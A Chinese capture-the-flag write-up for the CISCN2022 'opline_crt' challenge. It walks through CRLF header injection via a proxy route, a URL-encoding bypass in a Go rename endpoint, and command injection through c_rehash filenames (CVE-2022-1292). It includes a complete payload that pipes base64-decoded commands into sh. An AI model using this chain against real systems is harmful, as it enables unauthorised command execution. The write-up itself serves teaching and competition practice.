# [CISCN2022] opline_crt




# 0x01 前期准备

## 源码

题目源码用于本地的调试，有所改动，考虑篇幅，只展示重要逻辑代码

app.py

```python
@app.route('/getcrt', methods=['GET', 'POST'])
def upload():
    Country = request.form.get("Country", "CN")
    Province = request.form.get("Province", "a")
    City = request.form.get("City", "a")
    OrganizationalName = request.form.get("OrganizationalName", "a")
    CommonName = request.form.get("CommonName", "a")
    EmailAddress = request.form.get("EmailAddress", "a")
    return get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)


@app.route('/createlink', methods=['GET'])
def info():
    json_data = {"info": os.popen("c_rehash static/crt/ && ls static/crt/").read()}
    return json.dumps(json_data)


@app.route('/proxy', methods=['GET'])
def proxy():
    uri = request.form.get("uri", "/")
    client = socket.socket()
    client.connect(('localhost', 8887))
    msg = f'''GET {uri} HTTP/1.1
Host: test_api_host
User-Agent: Guest
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

'''
    client.send(msg.encode())
    data = client.recv(2048)
    client.close()
    return data.decode()

app.run(host="0.0.0.0", port=8888)

```

main.go

```go
package main

import (
	"github.com/gin-gonic/gin"
	"os"
	"strings"
)

func admin(c *gin.Context) {
	staticPath := "../static/crt/"
	oldname := c.DefaultQuery("oldname", "")
	newname := c.DefaultQuery("newname", "")
	if oldname == "" || newname == "" || strings.Contains(oldname, "..") || strings.Contains(newname, "..") {
		c.String(500, "error")
		return
	}
	if c.Request.URL.RawPath != "" && c.Request.Host == "admin" {
		err := os.Rename(staticPath+oldname, staticPath+newname)
		if err != nil {
			return
		}
		c.String(200, newname)
		return
	}
	c.String(200, "no")
}

func index(c *gin.Context) {
	c.String(200, "hello world")
}

func main() {
	router := gin.Default()
	router.GET("/", index)
	router.GET("/admin/rename", admin)

	if err := router.Run(":8887"); err != nil {
		panic(err)
	}
}

```

## 服务启动

因为flask里直接执行了命令，所以我们得把这个文件放到py文件的同级目录

![image-20220531011308669](https://tuchuang.huamang.xyz/img/image-20220531011308669.png)

接着启动服务，分别执行.

```
python3 app.py
go run main.go
```

![image-20220531020438519](https://tuchuang.huamang.xyz/img/image-20220531020438519.png)

# 0x02 题目逻辑

这里题目的逻辑大致是这样：

首先通过getcrt路由生成crt文件，然后利用go里的admin/rename去修改文件名，最后利用createlink里的c_rehash执行命令

![image-20220531020556035](https://tuchuang.huamang.xyz/img/image-20220531020556035.png)

可以看到proxy里面，是拼接了一个http包的

![image-20220531020721792](https://tuchuang.huamang.xyz/img/image-20220531020721792.png)

这里不免想到CRLF，进了go里面，那么有这样的条件需要满足

```go
	if c.Request.URL.RawPath != "" && c.Request.Host == "admin" {
		err := os.Rename(staticPath+oldname, staticPath+newname)
		if err != nil {
			return
		}
		c.String(200, newname)
		return
	}
	c.String(200, "no")
```

## c.Request.URL.RawPath的绕过

首先是`c.Request.URL.RawPath`，这个的绕过方法是url编码，我们用`%252f`代替/来绕过这个

接着是host得是admin，这里我们可以用CRLF来实现

## c_rehash的RCE:CVE-2022-1292

这里是给了c_rehash的源码的，先搜了一下这个cve，找到官方的[修复方案](https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=1ad73b4d27bd8c1b369a3cd453681d3a4f1bb9b2)，发现是在这里进行了修复

![image-20220531022605244](https://tuchuang.huamang.xyz/img/image-20220531022605244.png)



那么我们就可以对这里分析一下，这里可以从fname这里进行代码注入，类似于这样

```
1.crt"||id>1.txt||echo"
```

![image-20220531030310940](https://tuchuang.huamang.xyz/img/image-20220531030310940.png)



那么思路就清晰了

## 最后逻辑

我们先生成一个crt记录下文件名，然后通过proxy，到go的/admin/rename下，通过CRLF绕过host的判断，把文件名修改成代码注入的样子，最后通过createlink执行c_rehash进行命令执行



但是最后有一个问题，就是这里fname还是有过滤的，是不能出现斜杠，那么我们就没有办法读取到其他目录下的文件了，这里的绕过逻辑是通过**base64**进行消敏

`$fname =~ s/\"/\\\"/g;`

payload：

```
uri=/admin%252frename?oldname=8c3bcef7-62f5-476c-9c9d-9dc7054a5533.crt%26newname=1.crt"||echo${IFS}"Y2F0IC9mbGFnPnpob25nM2Nj"|base64${IFS}-d|sh${IFS}-i"%20HTTP/1.1%0d%0aHost:%20admin%0d%0a%0d%0aGET%20/
```

成功修改文件名

![image-20220531024730936](https://tuchuang.huamang.xyz/img/image-20220531024730936.png)



![image-20220531024543189](https://tuchuang.huamang.xyz/img/image-20220531024543189.png)



然后再到createlink执行命令

![image-20220531024111917](https://tuchuang.huamang.xyz/img/image-20220531024111917.png)

访问static/crt/1.txt，成功读取到/etc/passwd

![image-20220531024152898](https://tuchuang.huamang.xyz/img/image-20220531024152898.png)



## tricks

这里绕过Host判断，可以不用CRLF来绕过，这里可以用http://admin/admin/rename来绕过



![image-20220531025010258](https://tuchuang.huamang.xyz/img/image-20220531025010258.png)

可以看到是可以成功绕过的

